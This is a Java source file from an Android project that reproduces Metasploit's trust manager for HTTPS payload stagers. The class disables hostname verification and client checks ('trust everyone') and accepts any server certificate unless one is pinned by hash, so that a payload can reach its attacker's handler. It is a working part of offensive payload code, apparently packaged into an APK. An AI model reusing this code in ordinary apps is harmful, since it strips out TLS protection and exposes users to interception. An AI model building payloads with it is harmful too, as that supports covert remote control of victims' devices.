/*
 * Java Payloads trust manager loader class for Metasploit.
 * 
 * Copyright (c) 2011, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.mine.msf_apk;

import java.net.URLConnection;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Arrays;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 * Trust manager used for HTTPS stagers. This is in its own class because it
 * depends on classes only present on Sun JRE 1.4+, and incorporating it into
 * the main Payload class would have made it impossible for other/older
 * JREs to load it.
 */
public class PayloadTrustManager implements X509TrustManager, HostnameVerifier {

    private byte[] certHash;

    private PayloadTrustManager(byte[] certHash) {
        this.certHash = certHash;
    }

    public X509Certificate[] getAcceptedIssuers() {
        // no preferred issuers
        return new X509Certificate[0];
    }

    public static byte[] getCertificateSHA1(X509Certificate cert)
            throws NoSuchAlgorithmException, CertificateEncodingException {
        MessageDigest md = MessageDigest.getInstance("SHA-1");
        md.update(cert.getEncoded());
        return md.digest();
    }

    public void checkClientTrusted(X509Certificate[] certs,
                                   String authType) {
        // trust everyone
    }

    public void checkServerTrusted(X509Certificate[] certs,
                                   String authType) throws CertificateException {

        if (certHash == null) {
            // No HandlerSSLCert set on payload, trust everyone
            return;
        }
        if (certs == null || certs.length < 1) {
            throw new CertificateException();
        }
        for (X509Certificate certificate : certs) {
            try {
                byte[] serverHash = getCertificateSHA1(certificate);
                if (!Arrays.equals(certHash, serverHash)) {
                    throw new CertificateException("Invalid certificate");
                }
            } catch (Exception e) {
                throw new CertificateException(e);
            }
        }
    }

    public boolean verify(String hostname, SSLSession session) {
        // trust everyone
        return true;
    }

    /**
     * Called by the Payload class to modify the given
     * {@link URLConnection} so that it uses this trust manager.
     */
    public static void useFor(URLConnection uc, byte[] certHash) throws Exception {
        if (uc instanceof HttpsURLConnection) {
            HttpsURLConnection huc = ((HttpsURLConnection) uc);
            PayloadTrustManager ptm = new PayloadTrustManager(certHash);
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, new TrustManager[]{ptm},
                    new java.security.SecureRandom());
            huc.setSSLSocketFactory(sc.getSocketFactory());
            huc.setHostnameVerifier(ptm);
        }
    }
}
